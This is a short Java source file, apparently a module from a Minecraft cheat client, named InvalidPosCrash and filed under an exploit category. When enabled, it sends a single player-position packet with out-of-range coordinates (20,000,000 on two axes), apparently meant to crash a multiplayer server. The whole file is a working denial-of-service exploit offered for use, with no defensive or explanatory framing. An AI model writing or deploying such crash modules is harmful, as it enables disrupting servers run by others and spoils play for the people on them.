package cc.candy.candymod.module.crash;

import cc.candy.candymod.module.Module;
import net.minecraft.network.play.client.CPacketPlayer;

public class InvalidPosCrash extends Module {
    public InvalidPosCrash(){
        super("InvalidPosCrash" , Categories.EXPLOIT , false , false);
    }

    @Override
    public void onEnable(){
        if(nullCheck()) return;

        mc.player.connection.sendPacket(new CPacketPlayer.Position(20_000_000, 255, 20_000_000, true));
    }
}
